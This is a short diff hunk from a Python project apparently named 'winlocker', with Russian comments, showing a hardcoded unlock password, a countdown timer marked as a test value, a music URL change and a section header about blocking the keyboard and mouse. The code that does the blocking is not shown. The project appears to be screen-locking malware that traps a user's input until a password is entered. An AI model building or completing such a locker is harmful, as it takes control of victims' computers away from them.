@@ -3,7 +3,7 @@ import ctypes, os, sys, time, threading, random, tempfile, urllib.request, tkint
 # === НАСТРОЙКИ ===
 PASSWORD = "1601"
 TIMER_SECONDS = 15  # для теста, потом 600
-MUSIC_URL = "https://raw.githubusercontent.com/ippo123459-bit/winlocker/main/assets/music.mp3"
+MUSIC_URL = "https://github.com/ippo123459-bit/winlocker/blob/main/chrmbchrmb_-_matrix_bl_studio_loop_slowed_(SkySound.cc).mp3"
 MUSIC_FILE = os.path.join(tempfile.gettempdir(), "winlocker_music.mp3")
 
 # === БЛОКИРУЕМ КЛАВИАТУРУ И МЫШЬ ===
